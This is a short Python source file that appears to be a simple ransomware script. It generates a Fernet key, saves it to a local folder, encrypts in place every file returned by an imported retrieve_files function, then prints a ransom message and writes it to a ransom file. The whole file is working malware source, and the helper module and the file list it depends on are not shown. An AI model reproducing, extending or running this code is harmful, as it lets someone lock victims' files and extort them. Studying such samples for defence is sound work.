from utils import KEY_FILE_NAME, retrieve_files, MESSAGE, RANSOM_FILE
import os
from cryptography.fernet import Fernet


def generate_key():
    key = Fernet.generate_key()
    if not os.path.exists('./.key'): os.makedirs('./.key')
    with open(KEY_FILE_NAME, 'wb') as k:
        k.write(key)
    return key

def get_encrypted_content(key, content):
    return Fernet(key).encrypt(content)

def create_ranson_message():
    print(MESSAGE)
    open(RANSOM_FILE, 'w', encoding='utf-8').write(MESSAGE)
    
def main():
    key = generate_key()
    for f in retrieve_files():
        with open(f, 'rb+') as file:
            content = file.read()
            new_content = get_encrypted_content(key, content)
            file.seek(0)
            file.write(new_content)
            file.truncate()
    
    create_ranson_message()

if __name__ == '__main__':
    main()